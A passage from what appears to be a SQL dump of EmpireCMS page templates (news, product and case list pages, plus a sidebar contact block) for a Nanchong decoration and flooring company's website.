rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <div class=\\\"ny_newsdetial\\\">\r\n                <div class=\\\"news_name\\\">\r\n                    <h2>[!--title--]</h2>\r\n                    <p>时间：[!--newstime--] 来源：本站 作者：管理员</p>\r\n                </div>\r\n                <div class=\\\"prodetail22\\\">\r\n                    <p style=\\\"text-indent:2em;\\\">\r\n	               [!--newstext--]\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"sx\\\">\r\n                <div style=\\\" text-align:left; float:left; width:49%; margin-left:1%; line-height:40px;\\\">上一篇：[!--info.pre--]</div>\r\n                <div style=\\\" text-align:right; float:right; width:49%; margin-right:1%; line-height:40px;\\\">下一篇：[!--info.next--]</div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'',0,1,'Y-m-d H:i:s',0,0,0,1589785616,'newstemp',1,'admin'),(142,1,'新闻列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--] />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n\r\n                    \r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <ul class=\\\"news_list\\\">\r\n                \r\n\r\n\r\n                    [!--empirenews.listtemp--]\r\n                    <!--list.var1-->\r\n                    [!--empirenews.listtemp--]\r\n\r\n            </ul>\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:750px; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'                <li>\r\n                <span>[!--newstime--]</span>\r\n                <div class=\\\'news_txt2\\\' style=\\\"height: 82px\\\"><a href=\\\'[!--titleurl--]\\\'>[!--title--]</a><div class=\\\'clear\\\'></div>\r\n                <p>[!--smalltext--]...</p></div></li>',1,1,'Y-m-d',0,0,0,1587100821,'listtemp',1,'admin'),(54,3,'tel','<div class=\\\"ny_con\\\">\r\n                <ul>\r\n                    <li>\r\n                        <h1>联系我们</h1>\r\n                        <img src=\\\"/images/ny_lxwm.jpg\\\" alt=\\\"\\\">\r\n                        <p>\r\n                            手  机：15196780978(王经理)<br />\r\n                            邮  箱：1024957682@qq.com<br />\r\n                            地  址：顺庆区科苑街51号6幢1层128号\r\n                        </p>\r\n                    </li>\r\n                </ul>\r\n            </div>',0,0,'侧栏联系我们',0,0,'',0,0,0,1587011408,'tempvar',1,'admin'),(136,2,'产品列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:750px; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',200,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d',0,0,0,1587100635,'listtemp',1,'admin'),(160,3,'案例列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]4,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'<li>\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d H:i:s',22,0,0,1587619479,'listtemp',1,'admin'),(158,3,'案例列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]4,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul>   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n        </div>        \r\n\r\n\r\n            <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        \r\n    </div>\r\n</div>\r\n\r\n\r\n\r\n\r\n\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'<li\\\">\r\n                <a href=\\\'[!--titleurl--]\\\'>\r\n                <img src=\\\'[!--titlepic--]\\\'>\r\n                </a>\r\n                <p>\r\n                <a href=\\\'[!--titleurl--]\\\'>[!--title--]</a>\r\n                </p>\r\n                </li>',1,1,'Y-m-d H:i:s',22,0,0,1587619358,'listtemp',1,'admin'),(137,1,'新闻列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--] />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<div><img src=\\\"/images/2019092011404080.jpg\\\" alt=\\\"\\\" /></div>\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span><a href=\\\"/Pro/32-0.html\\\">功能性地坪</a><a href=\\\"/Pro/33-0.html\\\">环氧地坪</a><a href=\\\"/Pro/34-0.html\\\">高端商业地坪</a></div>\r\n        \r\n    </div>\r\n</div>\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_news\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_news_l_title.png\\\" alt=\\\"\\\"></dt>\r\n\r\n                    \r\n                    [showclasstemp]3,1,0,0[/showclasstemp]\r\n\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n\r\n        <div class=\\\"ny_news_content\\\">\r\n            <div class=\\\"daohang\\\"><p>当前位置：[!--newsnav--]</div>\r\n            <ul class=\\\"news_list\\\">\r\n                \r\n\r\n\r\n                    [!--empirenews.listtemp--]\r\n                    <!--list.var1-->\r\n                    [!--empirenews.listtemp--]\r\n\r\n            </ul>\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:750px; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid #ddd;display:inline-block;margin-right:6px;color: #707070;width:45px;height:34px;font:bold 14px/34px arial;}\r\n            .pageBox a:hover,.pageBox a:active{background:#3aa9f2;color: #FFFFFF;text-decoration: none;}\r\n            .pageBox .cur { background: #3aa9f2;border: 1px solid #3aa9f2;text-decoration: none;}\r\n            .pageBox a.cur {color: #fff;}\r\n            .pageBox .disabled {width: 79px;}\r\n</style>\r\n        </div>\r\n    </div>\r\n</div>\r\n[!--temp.footer--]\r\n<script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n<div id=\\\"kefu\\\"></div>\r\n<script src=\\\"/js/wow.min.js\\\" type=\\\"text/javascript\\\"></script>\r\n<script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n</body>\r\n</html>\r\n',0,0,'                <li>\r\n                <span>[!--newstime--]</span>\r\n                <div class=\\\'news_txt2\\\' style=\\\"height: 82px\\\"><a href=\\\'[!--titleurl--]\\\'>[!--title--]</a><div class=\\\'clear\\\'></div>\r\n                <p>[!--smalltext--]...</p></div></li>',1,1,'Y-m-d',0,0,0,1587100647,'listtemp',1,'admin'),(123,1,'子栏目导航标签模板','| [!--empirenews.listtemp--]<!--list.var1-->[!--empirenews.listtemp--]',0,0,'<dd><a href=\\\'[!--classurl--]\\\'>[!--classname--]</a></dd>',1,1,'Y-m-d H:i:s',0,0,0,1587095799,'bqtemp',1,'admin'),(149,2,'产品列表模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\"/>\r\n    <meta name=\\\"viewport\\\" content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\"/>\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\">\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\"/>\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\"/>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.pagination.js\\\"></script>\r\n    \r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n[!--temp.header--]\r\n<div class=\\\"ny_banner\\\">\r\n<img src=\\\"/images/2019092011402622.jpg\\\" alt=\\\"\\\" />\r\n</div>\r\n<div class=\\\"rmgjc_bg\\\">\r\n    <div class=\\\"rmgjc wow fadeInUp\\\">\r\n        <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n        [e:loop={1,3,0,0}]\r\n        <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n        [/e:loop]\r\n        </div>\r\n        \r\n    </div>\r\n</div>\r\n\r\n<div class=\\\"ny_main\\\">\r\n    <div class=\\\"ny_pro\\\">\r\n        <div class=\\\"ny_l\\\">\r\n            <div class=\\\"product_l product_l2\\\">\r\n                <dl>\r\n                    <dt><img src=\\\"/images/ny_pro_l_title.png\\\" alt=\\\"\\\"></dt>\r\n                    \r\n\r\n                    [showclasstemp]1,1,0,0[/showclasstemp]\r\n                </dl>\r\n            </div>\r\n            [!--temp.tel--]\r\n        </div>\r\n        <div class=\\\"ny_pro_content\\\">\r\n            <div class=\\\"daohang\\\"><p>您的位置：[!--newsnav--]</div>\r\n            <ul >   \r\n            [!--empirenews.listtemp--]\r\n            <!--list.var1-->\r\n            [!--empirenews.listtemp--]\r\n           </ul>\r\n                \r\n\r\n\r\n           <div class=\\\"pageBox\\\">[!--show.listpage--]</div>\r\n           <style type=\\\"text/css\\\">\r\n            .pageBox {text-align: center; width:90%; margin-bottom:25px; margin-top:25px; }\r\n            .pageBox a {border:1px solid 